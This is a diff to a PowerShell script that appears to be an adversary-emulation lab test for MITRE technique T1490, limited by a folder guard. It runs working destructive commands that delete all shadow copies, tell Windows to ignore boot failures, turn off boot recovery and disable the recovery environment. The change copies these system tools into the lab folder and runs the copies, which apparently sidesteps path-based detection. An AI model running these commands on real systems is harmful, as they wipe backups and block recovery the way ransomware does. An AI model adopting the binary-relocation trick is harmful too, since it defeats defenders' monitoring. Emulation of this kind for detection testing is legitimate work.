@@ -3,16 +3,21 @@ $ProgressPreference = 'SilentlyContinue'
 $dir = Split-Path -Parent $MyInvocation.MyCommand.Path
 if ($dir -notlike 'C:\lab-attack\ATA063*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
 $ev = Join-Path $dir 'evidencias'; New-Item -ItemType Directory -Force -Path $ev | Out-Null
+$tools = @('vssadmin.exe','bcdedit.exe','reagentc.exe')
+foreach ($t in $tools) { $src = Join-Path $env:SystemRoot ("System32\" + $t); if (Test-Path $src) { Copy-Item $src (Join-Path $dir $t) -Force -ErrorAction SilentlyContinue } }
+$vss = if (Test-Path (Join-Path $dir 'vssadmin.exe')) { Join-Path $dir 'vssadmin.exe' } else { 'vssadmin.exe' }
+$bcd = if (Test-Path (Join-Path $dir 'bcdedit.exe')) { Join-Path $dir 'bcdedit.exe' } else { 'bcdedit.exe' }
+$reg = if (Test-Path (Join-Path $dir 'reagentc.exe')) { Join-Path $dir 'reagentc.exe' } else { 'reagentc.exe' }
 $t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
-$vss0 = & vssadmin.exe list shadows 2>&1 | Out-String
-& vssadmin.exe delete shadows /all /quiet 2>&1 | Out-File (Join-Path $ev 'vssadmin.out') -Encoding ascii
-$bcd0 = & bcdedit.exe /enum "{default}" 2>&1 | Out-String
-& bcdedit.exe /set "{default}" bootstatuspolicy ignoreallfailures 2>&1 | Out-File (Join-Path $ev 'bcdedit_bootstatuspolicy.out') -Encoding ascii
-& bcdedit.exe /set "{default}" recoveryenabled no 2>&1 | Out-File (Join-Path $ev 'bcdedit_recoveryenabled.out') -Encoding ascii
-$reg0 = & reagentc.exe /info 2>&1 | Out-String
-& reagentc.exe /disable 2>&1 | Out-File (Join-Path $ev 'reagentc_disable.out') -Encoding ascii
-$bcd1 = & bcdedit.exe /enum "{default}" 2>&1 | Out-String
-$reg1 = & reagentc.exe /info 2>&1 | Out-String
+$vss0 = & $vss list shadows 2>&1 | Out-String
+& $vss delete shadows /all /quiet 2>&1 | Out-File (Join-Path $ev 'vssadmin.out') -Encoding ascii
+$bcd0 = & $bcd /enum "{default}" 2>&1 | Out-String
+& $bcd /set "{default}" bootstatuspolicy ignoreallfailures 2>&1 | Out-File (Join-Path $ev 'bcdedit_bootstatuspolicy.out') -Encoding ascii
+& $bcd /set "{default}" recoveryenabled no 2>&1 | Out-File (Join-Path $ev 'bcdedit_recoveryenabled.out') -Encoding ascii
+$reg0 = & $reg /info 2>&1 | Out-String
+& $reg /disable 2>&1 | Out-File (Join-Path $ev 'reagentc_disable.out') -Encoding ascii
+$bcd1 = & $bcd /enum "{default}" 2>&1 | Out-String
+$reg1 = & $reg /info 2>&1 | Out-String
 $t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
 $salida = @(
     "ata=ATA063", "tecnica=T1490", "fuente=ART_adaptado",
